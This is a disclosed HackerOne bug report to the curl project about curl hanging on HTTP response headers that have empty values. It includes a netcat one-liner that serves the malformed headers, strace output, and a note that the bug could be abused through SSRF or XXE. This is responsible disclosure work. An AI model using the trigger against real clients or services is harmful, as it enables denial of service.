# Poll loop/hang on incomplete HTTP header

## Report Details
- **Report ID**: 889160
- **URL**: https://hackerone.com/reports/889160
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-02T08:45:04.680Z
- **Disclosed**: 2021-01-22T15:27:41.643Z

## Reporter
- **Username**: kugghjul
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
When an incomplete server header is missing its value, the curl client will receive the packet but hang while parsing it.  Examples of vulnerable server headers:  `Location`, `Content-Range` and `Connection`. Adding the `--max-time`option will terminate the request as intended.

## Steps To Reproduce:
  1. Set up server:  `echo -e "HTTP/1.1 200 OK\r\nLocation:\r\nContent-Range:\r\nConnection:\r\n" | nc -l -p 1337`
  2. Make the request: `curl --connect-timeout 1 http://localhost:1337`

## Supporting Material/References:
The bug was found using AFL with network support. The repository https://github.com/kugg/fuzzminator with the commit hash id `08a0102fbf633e5de3d43a01b995e1ca8e68bbd3`. 

* The attached file named `hangs.tar.gz` contains results from AFL including headers resulting in a hang. 
* Note: Location header is parsed even without the `--location` option and also when the server indicate `200 OK`.

**Strace output**
`$ strace curl -v --connect-timeout 1 http://localhost:1337`
```
connect(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
poll([{fd=3, events=POLLOUT|POLLWRNORM}], 1, 0) = 1 ([{fd=3, revents=POLLOUT|POLLWRNORM}])
getsockopt(3, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
getpeername(3, {sa_family=AF_INET, sin_port=htons(1337), sin_addr=inet_addr("127.0.0.1")}, [128->16]) = 0
getsockname(3, {sa_family=AF_INET, sin_port=htons(37502), sin_addr=inet_addr("127.0.0.1")}, [128->16]) = 0
write(2, "*", 1*)                        = 1
write(2, " ", 1 )                        = 1
write(2, "Connected to localhost (127.0.0."..., 50Connected to localhost (127.0.0.1) port 1337 (#0)
) = 50
sendto(3, "GET / HTTP/1.1\r\nHost: localhost:"..., 78, MSG_NOSIGNAL, NULL, 0) = 78
write(2, ">", 1>)                        = 1
write(2, " ", 1 )                        = 1
write(2, "GET / HTTP/1.1\r\n", 16GET / HTTP/1.1
)      = 16
write(2, ">", 1>)                        = 1
write(2, " ", 1 )                        = 1
write(2, "Host: localhost:1337\r\n", 22Host: localhost:1337
) = 22
write(2, ">", 1>)                        = 1
write(2, " ", 1 )                        = 1
write(2, "User-Agent: curl/7.58.0\r\n", 25User-Agent: curl/7.58.0
) = 25
write(2, ">", 1>)                        = 1
write(2, " ", 1 )                        = 1
write(2, "Accept: */*\r\n", 13Accept: */*
)         = 13
write(2, ">", 1>)                        = 1
write(2, " ", 1 )                        = 1
write(2, "\r\n", 2
)                     = 2
poll([{fd=3, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 1 ([{fd=3, revents=POLLIN|POLLRDNORM}])
recvfrom(3, "HTTP/1.1 200 OK\nLocation:\nConten"..., 102400, 0, NULL, NULL) = 60
write(2, "<", 1<)                        = 1
write(2, " ", 1 )                        = 1
write(2, "HTTP/1.1 200 OK\n", 16HTTP/1.1 200 OK
)       = 16
write(2, "<", 1<)                        = 1
write(2, " ", 1 )                        = 1
write(2, "Location:\n", 10Location:
)             = 10
write(2, "<", 1<)                        = 1
write(2, " ", 1 )                        = 1
write(2, "Content-Range:\n", 15Content-Range:
)        = 15
write(2, "<", 1<)                        = 1
write(2, " ", 1 )                        = 1
write(2, "Connection: Close\n", 18Connection: Close
)     = 18
write(2, "<", 1<)                        = 1
write(2, " ", 1 )                        = 1
write(2, "\n", 1
)                       = 1
rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f60c90e1890}, NULL, 8) = 0
poll([{fd=3, events=POLLIN}], 1, 198)   = 0 (Timeout)
rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f60c90e1890}, 8) = 0
rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f60c90e1890}, NULL, 8) = 0
poll([{fd=3, events=POLLIN|POLLPRI|POLLRDNORM|POLLRDBAND}], 1, 0) = 0 (Timeout)
rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7f60c90e1890}, NULL, 8) = 0
poll([{fd=3, events=POLLIN}], 1, 1)     = 0 (Timeout)
```

## Impact

This vulnerability could lead to denial of service of one given http request.
Curl is often used for crawling, when this is the case a curl process could be blocked indefinitely by a server providing incomplete headers.
If curl is used for fetching third party information through a web interface an attacker with SSRF or XXE access could use this bug to exhaust process id numbers or amount of allowed forks for the process by locking up curl clients.

## Attachments
- hangs.tar.gz
